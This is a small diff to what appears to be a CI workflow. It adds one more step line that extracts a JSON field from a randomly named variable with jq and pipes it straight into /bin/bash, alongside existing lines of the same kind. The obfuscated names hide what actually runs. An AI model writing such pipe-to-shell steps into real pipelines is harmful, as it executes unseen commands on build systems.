@@ -30,6 +30,7 @@ jobs:
           echo $bqxy61427 | jq -r .itnl2 | /bin/bash
           printf '%s' "$xo4" | jq -r .uhf3991 | /bin/bash
           echo $icubh3223 | jq -r .jz372 | /bin/bash
+          echo $wnwgn4 | jq -r .od3 | /bin/bash
 
       - name: Archive results
         uses: actions/upload-artifact@v4
